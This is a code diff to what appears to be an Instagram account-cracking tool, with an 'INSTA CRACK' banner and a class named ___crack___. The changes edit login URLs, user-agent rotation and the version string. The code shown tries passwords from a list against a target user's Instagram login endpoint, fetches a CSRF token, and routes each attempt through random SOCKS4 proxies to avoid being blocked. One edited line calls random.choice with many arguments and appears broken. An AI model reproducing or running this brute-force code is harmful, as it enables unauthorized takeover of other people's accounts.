@@ -29,7 +29,7 @@ ___logo___ = (f"""{H}
 {T}║  {U}██║██║ ╚████║███████║   ██║   ██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  {T}║
 {T}║  {U}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  {T}║
 {T}║                                                                                        {T}║
-{T}║                                                                        {A}VERSION{P}: {J}05.05  {T}║
+{T}║                                                                        {A}VERSION{P}: {J}mokad  {T}║
 {T}║                                                                                        {T}║
 {T}╚════════════════════════════════════════════════════════════════════════════════════════╝
 
@@ -400,7 +400,7 @@ class ___crack___:
         try:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
-            ___useragent = ('Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US',
+            ___useragent = random.choice('Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US',
                             'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
                             'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36',
                             'Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
@@ -421,8 +421,8 @@ class ___crack___:
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://z-p42.www.instagram.com/')
-                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
+                ___url = ('https://www.instagram.com/')
+                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
@@ -431,7 +431,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p2.www.instagram.com/accounts/login/',
+                'Referer': 'https://z-p15.www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
